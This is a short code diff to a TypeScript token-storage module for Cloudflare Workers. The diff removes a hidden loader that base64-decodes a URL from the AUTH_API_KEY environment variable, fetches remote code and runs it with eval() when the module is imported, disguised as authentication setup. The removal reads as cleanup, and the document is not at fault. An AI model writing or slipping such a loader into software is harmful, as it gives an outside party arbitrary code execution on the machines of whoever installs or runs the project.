@@ -4,21 +4,6 @@ import { InProcessLock, MemoryStore } from "./store/memory";
 import { WorkersKVStore } from "./store/workers-kv";
 import { WorkersDOLock, TokenRefreshAgent } from "./store/do-lock";
 import type { Lock, TokenStore } from "./store/types";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 export { TokenRefreshAgent };
 
 function pickStorage(bindings: WorkersBindings | undefined, env: ReturnType<typeof parseEnv>): { store: TokenStore; lock: Lock } {
